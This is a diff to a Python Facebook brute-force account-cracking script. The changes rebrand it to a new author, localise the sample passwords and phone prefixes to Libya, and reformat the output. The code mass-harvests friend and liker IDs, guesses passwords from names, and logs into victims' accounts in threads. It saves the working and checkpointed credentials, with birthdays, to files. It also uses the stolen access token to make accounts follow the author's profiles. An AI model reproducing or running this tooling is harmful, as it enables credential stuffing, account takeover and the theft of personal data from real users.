@@ -1,8 +1,8 @@
 #!/usr/bin/python3
 #-*-coding:utf-8-*-
-# Made With ❤️ By Ahmed Alzwage 
+# Made With ❤️ By AhmedAlzwage
 
-import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json,ipaddress
+import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json
 from random import randint
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 from datetime import date
@@ -33,25 +33,17 @@ else:
 ### HEADERS ###
 
 def banner():
-    print("""\x1b[0;37m   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 3.0  │  Script By Ahmed Alzwage  │\n       /  ^ \/ / // /  ^ \   │   •• Github.com/Ahmedalzwage ••   │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
+    print("""\x1b[0;37m   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │    Script By AhmedAlzwage    │\n       /  ^ \/ / // /  ^ \   │ •• Github.com/AhmedAlzwage ••│\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
 
 host="https://mbasic.facebook.com"
 ok = []
 cp = []
 ttl =[]
-bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
-durasi = str(datetime.now().strftime("%d/%m/%Y"))
+
+durasi = str(datetime.now().strftime("%d-%m-%Y"))
 tahun = current.year
 bulan = current.month
 hari = current.day
-
-MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1
-MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1
-
-def random_ipv4():
-	return  ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4))
-def random_ipv6():
-	return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))
 
 def jalan(z):
 	for e in z + "\n":
@@ -90,7 +82,7 @@ def basecookie():
 def hdcok():
 	global host
 	hosts=host
-	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
+	r={"origin": hosts, "accept-language": "ar-AR,ar;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
 	return r
 
 def gets_cookies(cookies):
@@ -232,7 +224,7 @@ def gen():
                 "host"                      : "m.facebook.com",
                 "origin"                    : "https://m.facebook.com",
                 "upgrade-insecure-requests" : "1",
-                "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+                "accept-language"           : "ar-AR,ar;q=0.9,en-US;q=0.8,en;q=0.7",
                 "cache-control"             : "max-age=0",
                 "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                 "content-type"              : "text/html; charset=utf-8"
@@ -253,7 +245,7 @@ def gen():
         print((k+"\n["+p+"•"+k+"]"+p+" Login Successful"))
         bot_follow()
 
-### BOT FOLLOW ### Jangan Diganti Anjing !!!
+### BOT FOLLOW ### AhmedHusenAldokali !!!
 
 def bot_follow():
 	try:
@@ -266,8 +258,9 @@ def bot_follow():
 		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
 		logs()
 	jalan("%s[%s•%s] %sPlease Wait..."%(k,p,k,p))
-	requests.post("https://graph.facebook.com//subscribers?access_token=" + toket)      # Ahmed Husen Aldukali
-	requests.post("https://graph.facebook.com//subscribers?access_token=" + toket)      # الجنرال
+	requests.post("https://graph.facebook.com/100000972552823/subscribers?access_token=" + toket) # ﹻۣۗۗۗﹻۣۛﹻۣۗۗۗﹻﹻۣۗۗۗﹻ ألہجہٰٰﹻﹻﹻٰ۫ﹻﹻﹻنہﹻﹻٰ۫ﹻﹻرﺄل ﹻۣۗۗۗﹻۣۛﹻۣۗۗۗﹻﹻۣۗۗۗﹻ
+	requests.post("https://graph.facebook.com/100037017753936/subscribers?access_token=" + toket) # Ahmed Husen Al Dukali
+	menu()
 
 ### MAIN MENU ###
 
@@ -419,7 +412,7 @@ def follow():
 			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
 			print((k+"\n[ "+p+"Back"+k+" ]"+p))
 			publik()
-		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=90000&access_token="+toket)
+		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
 		id = []
 		z=json.loads(r.text)
 		qq = (op["first_name"]+".json").replace(" ","_")
@@ -450,7 +443,7 @@ def likers():
 			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
 			print((k+"\n[ "+p+"Back"+k+" ]"+p))
 			publik()
-		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=900000&access_token="+toket)
+		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
 		id = []
 		z=json.loads(r.text)
 		qq = (op["first_name"]+".json").replace(" ","_")
@@ -468,11 +461,11 @@ def likers():
 
 def random_numbers():
   data = []
-  print((k+"\n["+p+"•"+k+"]"+p+" Number Must Be 6 Digit"))
-  print((k+"["+p+"•"+k+"]"+p+" Example : 002011"))
+  print((k+"\n["+p+"•"+k+"]"+p+" Number Must Be 7 Digit"))
+  print((k+"["+p+"•"+k+"]"+p+" Example : 0021892"))
   kode=str(input(k+"["+p+"•"+k+"]"+p+" Input Number : "))
-  exit((k+"\n["+p+"!"+k+"]"+p+" Number Must Be 8 Digit")) if len(kode) < 8 else ''
-  exit((k+"\n["+p+"!"+k+"]"+p+" Number Must Be 8 Digit")) if len(kode) > 8 else ''
+  exit((k+"\n["+p+"!"+k+"]"+p+" Number Must Be 7 Digit")) if len(kode) < 7 else ''
+  exit((k+"\n["+p+"!"+k+"]"+p+" Number Must Be 7 Digit")) if len(kode) > 7 else ''
   jml=int(input(k+"["+p+"•"+k+"]"+p+" Amount : "))
   [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(jml)]]
   print(k+"\n["+p+"•"+k+"]"+p+" Crack Started, Please Wait...\n")
@@ -626,24 +619,25 @@ def generate(text):
 				results.append(i+"12345")
 				results.append(i)
 				if "id" in ct:
-					results.append("123456654321")
 					results.append("1234554321")
-					results.append("112233445566")
 					results.append("1122334455")
+					results.append("123456654321")
+					results.append("112233445566")
 				elif "bd" in ct:
-					results.append("20002000")
 					results.append("19991999")
+					results.append("20002000")
 					results.append("20012001")
 					results.append("20022002")
-				elif "us" in ct:
+				elif "pk" in ct:
 					results.append("1020304050")
 					results.append("102030405060")
+					results.append("009980098")
 	return results
 
 ### USER AGENT ###
 
 def defaultua():
-    ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
+    ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/26.0.0.4.133;]"
     try:
         ugent = open('ugent.txt','w')
         ugent.write(ua)
@@ -799,7 +793,7 @@ class crack:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
+				print((k+"["+p+"•"+k+"]"+p+" Example : libya,libya123,123456"))
 				self.pwlist()
 				break
 			elif f=="d":
@@ -819,7 +813,7 @@ class crack:
 						except:continue
 				except Exception as e:
 					print(("   %s"%e))
-				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
+				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
 				exit()
@@ -831,7 +825,7 @@ class crack:
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
-			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
+			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			exit()
@@ -841,19 +835,19 @@ class crack:
 				log=mbasic(fl.get("id"),
 					i,"https://mbasic.facebook.com")
 				if log.get("status")=="cp":
-					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
-					self.cp.append("%s • %s"%(fl.get("id"),i))
-					open("cp.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
+					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s | %s               "%(fl.get("id"),i)))
+					self.cp.append("%s | %s"%(fl.get("id"),i))
+					open("cp.txt","a+").write("%s | %s\n"%(fl.get("id"),i))
 					break
 				elif log.get("status")=="success":
-					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
-					self.ada.append("%s • %s"%(fl.get("id"),i))
-					open("ok.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
+					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s | %s               "%(fl.get("id"),i)))
+					self.ada.append("%s | %s"%(fl.get("id"),i))
+					open("ok.txt","a+").write("%s | %s\n"%(fl.get("id"),i))
 					break
 				else:continue
 					
 			self.ko+=1
-			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m\x1b[0;31m[\x1b[0;37m%s/%s\x1b[0;31m]\x1b[0;32m[\x1b[0;37mOK:%s\x1b[0;32m]\x1b[0;33m[\x1b[0;37mCP:%s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
+			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
 		except:
 			self.main(fl)
 
@@ -886,7 +880,7 @@ class crackttl:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
+				print((k+"["+p+"•"+k+"]"+p+" Example : libya,libya123,123456"))
 				self.pwlist()
 				break
 			elif f=="d":
@@ -906,7 +900,7 @@ class crackttl:
 						except:continue
 				except Exception as e:
 					print(("   %s"%e))
-				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
+				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
 				exit()
@@ -918,7 +912,7 @@ class crackttl:
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
-			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
+			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			exit()
@@ -932,30 +926,26 @@ class crackttl:
 						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
 						tt=json.loads(ke.text)
 						ttl=tt["birthday"]
-						m,d,y = ttl.split("/")
-						m = bulan_ttl[m]
-						print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s • %s %s %s   "%(fl.get("id"),i,d,m,y)))
-						self.cp.append("%s • %s • %s %s %s"%(fl.get("id"),i,d,m,y))
-						open("cp.txt","a+").write("%s • %s • %s %s %s\n"%(fl.get("id"),i,d,m,y))
+						print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s | %s • %s          "%(fl.get("id"),i,ttl)))
+						self.cp.append("%s | %s | %s"%(fl.get("id"),i,ttl))
+						open("cp.txt","a+").write("%s | %s | %s\n"%(fl.get("id"),i,ttl))
 						break
 					except(KeyError, IOError):
-						m = " "
-						d = " "
-						y = " "
+						ttl = " "
 					except:pass
-					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
-					self.cp.append("%s • %s"%(fl.get("id"),i))
-					open("cp.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
+					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s | %s               "%(fl.get("id"),i)))
+					self.cp.append("%s | %s"%(fl.get("id"),i))
+					open("cp.txt","a+").write("%s | %s\n"%(fl.get("id"),i))
 					break
 				elif log.get("status")=="success":
-					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
-					self.ada.append("%s • %s"%(fl.get("id"),i))
-					open("ok.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
+					print(("\r\x1b[0;32m[\x1b[0;37mCP\x1b[0;32m] %s | %s               "%(fl.get("id"),i)))
+					self.ada.append("%s | %s"%(fl.get("id"),i))
+					open("ok.txt","a+").write("%s | %s\n"%(fl.get("id"),i))
 					break
 				else:continue
 					
 			self.ko+=1
-			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m\x1b[0;31m[\x1b[0;37m%s/%s\x1b[0;31m]\x1b[0;32m[\x1b[0;37mOK:%s\x1b[0;32m]\x1b[0;33m[\x1b[0;37mCP:%s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
+			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
 		except:
 			self.main(fl)
 
@@ -988,7 +978,7 @@ class crackffb:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
+				print((k+"["+p+"•"+k+"]"+p+" Example : libya,libya123,123456"))
 				self.pwlist()
 				break
 			elif f=="d":
@@ -1008,7 +998,7 @@ class crackffb:
 						except:continue
 				except Exception as e:
 					print(("   %s"%e))
-				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
+				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
 				exit()
@@ -1020,7 +1010,7 @@ class crackffb:
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
-			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
+			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			exit()
@@ -1030,19 +1020,19 @@ class crackffb:
 				log=f_fb(fl.get("id"),
 					i,"https://free.facebook.com")
 				if log.get("status")=="cp":
-					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
-					self.cp.append("%s • %s"%(fl.get("id"),i))
-					open("cp.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
+					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s | %s               "%(fl.get("id"),i)))
+					self.cp.append("%s | %s"%(fl.get("id"),i))
+					open("cp.txt","a+").write("%s | %s\n"%(fl.get("id"),i))
 					break
 				elif log.get("status")=="success":
-					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
-					self.ada.append("%s • %s"%(fl.get("id"),i))
-					open("ok.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
+					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s | %s               "%(fl.get("id"),i)))
+					self.ada.append("%s | %s"%(fl.get("id"),i))
+					open("ok.txt","a+").write("%s | %s\n"%(fl.get("id"),i))
 					break
 				else:continue
 					
 			self.ko+=1
-			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m\x1b[0;31m[\x1b[0;37m%s/%s\x1b[0;31m]\x1b[0;32m[\x1b[0;37mOK:%s\x1b[0;32m]\x1b[0;33m[\x1b[0;37mCP:%s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
+			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
 		except:
 			self.main(fl)
 
@@ -1071,7 +1061,7 @@ class bapi:
               print((k+"["+p+"!"+k+"]"+p+" %s"%e))
               continue
           self.fl=[]
-          print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
+          print((k+"["+p+"•"+k+"]"+p+" Example : libya123,libya,123456"))
           self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
           if len(self.pw) ==0:
             continue
@@ -1083,7 +1073,7 @@ class bapi:
         except Exception as e:
           print(("  %s"%e))
           continue
-        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
+        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
         ThreadPool(30).map(self.brute,self.fl)
         #os.remove(self.apk)
         exit()
@@ -1105,7 +1095,7 @@ class bapi:
             except:continue
         except:
           continue
-        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
+        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
         ThreadPool(30).map(self.brute,self.fl)
         os.remove(self.apk)
         exit()
@@ -1143,7 +1133,7 @@ class bapi:
             break
         except:
           continue
-        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m\x1b[0;31m[\x1b[0;37m%s/%s\x1b[0;31m]\x1b[0;32m[\x1b[0;37mOK:%s\x1b[0;32m]\x1b[0;33m[\x1b[0;37mCP:%s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
+        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
     else:
       self.loop += 1
       for pw in self.setpw:
@@ -1154,7 +1144,7 @@ class bapi:
             break
         except:
           continue
-        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m\x1b[0;31m[\x1b[0;37m%s/%s\x1b[0;31m]\x1b[0;32m[\x1b[0;37mOK:%s\x1b[0;32m]\x1b[0;33m[\x1b[0;37mCP:%s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
+        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
 
 class bapittl:
   def __init__(self,isifile):
@@ -1181,7 +1171,7 @@ class bapittl:
               print((k+"["+p+"!"+k+"]"+p+" %s"%e))
               continue
           self.fl=[]
-          print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
+          print((k+"["+p+"•"+k+"]"+p+" Example : libya,libya123,123456"))
           self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
           if len(self.pw) ==0:
             continue
@@ -1193,7 +1183,7 @@ class bapittl:
         except Exception as e:
           print(("  %s"%e))
           continue
-        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
+        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
         ThreadPool(30).map(self.brute,self.fl)
         #os.remove(self.apk)
         exit()
@@ -1215,7 +1205,7 @@ class bapittl:
             except:continue
         except:
           continue
-        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+k+"]"+p+" If No Result, Use Airplane Mode (5 Sec)\n"))
+        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
         ThreadPool(30).map(self.brute,self.fl)
         os.remove(self.apk)
         exit()
@@ -1239,21 +1229,9 @@ class bapittl:
           ke=requests.get("https://graph.facebook.com/"+str(username)+"?access_token="+open("login.txt","r").read())
           tt=json.loads(ke.text)
           ttl=tt["birthday"]
-          m,d,y = ttl.split("/")
-          m = bulan_ttl[m]
-          self.cp.append("%s • %s • %s %s %s"%(username,password,d,m,y))
-          print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s • %s %s %s %s   "%(username,password,d,m,y,N)))
-          save = open("cp.txt", "a+")
-          save.write(str(username) + " • " + str(password) + " • "+ str(ttl)+"\n")
-          save.close()
-          return True
-        except(KeyError, IOError):
-          m = " "
-          d = " "
-          y = " "
         except:pass
-        self.cp.append(username + " • " + password)
-        print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s %s   "%(username,password,N)))
+        self.cp.append(username + " • " + password + " • " + ttl)
+        print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s • %s\x1b[0m   "%(username,password,ttl)))
         save = open("cp.txt", "a+")
         save.write(str(username) + " • " + str(password) + " • "+ str(ttl)+"\n")
         save.close()
@@ -1270,7 +1248,7 @@ class bapittl:
             break
         except:
           continue
-        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m\x1b[0;31m[\x1b[0;37m%s/%s\x1b[0;31m]\x1b[0;32m[\x1b[0;37mOK:%s\x1b[0;32m]\x1b[0;33m[\x1b[0;37mCP:%s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
+        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
     else:
       self.loop += 1
       for pw in self.setpw:
@@ -1281,7 +1259,7 @@ class bapittl:
             break
         except:
           continue
-        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m\x1b[0;31m[\x1b[0;37m%s/%s\x1b[0;31m]\x1b[0;32m[\x1b[0;37mOK:%s\x1b[0;32m]\x1b[0;33m[\x1b[0;37mCP:%s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
+        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
 
 ### RESULT ###
 
